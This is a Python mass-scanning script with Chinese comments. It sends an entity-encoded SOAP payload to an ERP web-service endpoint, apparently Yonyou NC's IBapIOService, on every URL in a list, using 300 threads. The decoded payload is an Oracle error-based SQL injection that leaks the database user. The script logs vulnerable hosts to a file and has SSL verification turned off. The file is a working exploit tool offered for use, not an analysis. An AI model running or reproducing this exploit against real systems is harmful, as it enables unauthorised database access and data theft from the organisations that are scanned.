import requests
import threading
import queue
import urllib3
import sys
from urllib.parse import urljoin, urlparse

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于安全写入文件
file_lock = threading.Lock()

# 漏洞检测的POC数据
POC_DATA = """<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header/>
    <soapenv:Body>
        <gs:getBapTableDatas>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;&#x20;&#x61;&#x62;&#x63;
</gs:stringarrayItem>
        </gs:getBapTableDatas>
    </soapenv:Body>
</soapenv:Envelope>"""

# 漏洞特征字符串
VULN_STRING = "SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE"

# 请求头
HEADERS = {
    'Content-Type': 'text/xml',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 确保URL格式正确，拼接路径
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            url = "http://" + url
        
        # 确保有完整的路径
        target_url = urljoin(url.rstrip('/') + '/', 'uapws/service/nc.itf.bap.service.IBapIOService')
        
        # 发送POST请求，禁用SSL验证
        response = requests.post(
            target_url,
            data=POC_DATA,
            headers=HEADERS,
            verify=False,
            timeout=10,
            allow_redirects=False  # 不跟随重定向
        )
        
        # 检查状态码
        status_code = response.status_code
        
        # 如果状态码是3xx，认为不存在漏洞
        if 300 <= status_code < 400:
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞（3xx重定向）")
            return None, None
        
        # 检查响应中是否包含漏洞特征字符串
        response_text = response.text
        if VULN_STRING in response_text:
            print(f"[VULNERABLE] {url} - 发现漏洞！")
            return url, {
                'url': url,
                'target_url': target_url,
                'status_code': status_code,
                'response_length': len(response_text),
                'vulnerable': True
            }
        else:
            print(f"[SAFE] {url} - 状态码 {status_code}，响应中未发现漏洞特征")
            return None, None
            
    except requests.exceptions.SSLError as e:
        print(f"[ERROR] {url} - SSL错误: {str(e)}")
        return None, None
    except requests.exceptions.ConnectionError as e:
        print(f"[ERROR] {url} - 连接错误: {str(e)}")
        return None, None
    except requests.exceptions.Timeout as e:
        print(f"[ERROR] {url} - 请求超时")
        return None, None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None, None

def worker(url_queue, results_file):
    """
    工作线程函数
    """
    while True:
        try:
            url = url_queue.get_nowait()
        except queue.Empty:
            break
            
        vuln_url, vuln_info = check_vulnerability(url)
        
        # 如果发现漏洞，立即写入文件
        if vuln_url and vuln_info:
            with file_lock:
                try:
                    with open(results_file, 'a', encoding='utf-8') as f:
                        f.write(f"存在漏洞的URL: {vuln_info['url']}\n")
                        f.write(f"目标地址: {vuln_info['target_url']}\n")
                        f.write(f"状态码: {vuln_info['status_code']}\n")
                        f.write(f"响应长度: {vuln_info['response_length']}\n")
                        f.write(f"漏洞特征: {VULN_STRING[:50]}...\n")
                        f.write("-" * 50 + "\n\n")
                    print(f"[SUCCESS] 已将漏洞信息写入 {results_file}")
                except Exception as e:
                    print(f"[ERROR] 写入文件失败: {str(e)}")
        
        url_queue.task_done()

def main():
    # 从命令行参数获取文件路径，或使用默认值
    url_file = 'url.txt'
    results_file = 'result.txt'
    
    if len(sys.argv) > 1:
        url_file = sys.argv[1]
    if len(sys.argv) > 2:
        results_file = sys.argv[2]
    
    # 读取URL列表
    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] 文件 {url_file} 不存在")
        return
    except Exception as e:
        print(f"[ERROR] 读取文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] URL列表为空")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL")
    print(f"[INFO] 开始漏洞检测，线程数: 300")
    print(f"[INFO] 结果将保存到: {results_file}")
    
    # 创建队列并添加URL
    url_queue = queue.Queue()
    for url in urls:
        url_queue.put(url)
    
    # 创建并启动线程
    threads = []
    for i in range(300):  # 300个线程
        thread = threading.Thread(
            target=worker,
            args=(url_queue, results_file),
            daemon=True
        )
        thread.start()
        threads.append(thread)
    
    # 等待所有任务完成
    url_queue.join()
    
    # 等待所有线程结束
    for thread in threads:
        thread.join(timeout=1)
    
    print(f"[INFO] 所有任务完成")

if __name__ == "__main__":
    main()